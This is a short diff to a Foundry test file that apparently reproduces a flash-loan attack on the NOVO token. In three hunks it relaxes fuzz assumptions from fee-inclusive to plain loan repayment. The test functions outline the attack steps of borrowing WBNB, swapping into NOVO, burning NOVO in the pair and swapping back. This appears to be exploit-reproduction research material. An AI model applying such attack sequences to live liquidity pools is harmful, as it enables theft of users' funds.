@@ -213,7 +213,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt5
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 >= (amt0 * 1003) / 1000);
+        vm.assume(amt5 >= amt0);
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_novo(amt1, amt2);
         swap_pair_attacker_novo_wbnb(amt3, amt4);
@@ -232,7 +232,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt6
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        vm.assume(amt6 >= amt0);
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_novo(amt1, amt2);
         burn_novo_pair(amt3);
@@ -274,7 +274,7 @@ contract NOVOTest is Test, BlockLoader {
         uint256 amt6
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        vm.assume(amt6 >= amt0);
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_novo(amt1, amt2);
         burn_novo_pair(amt3);
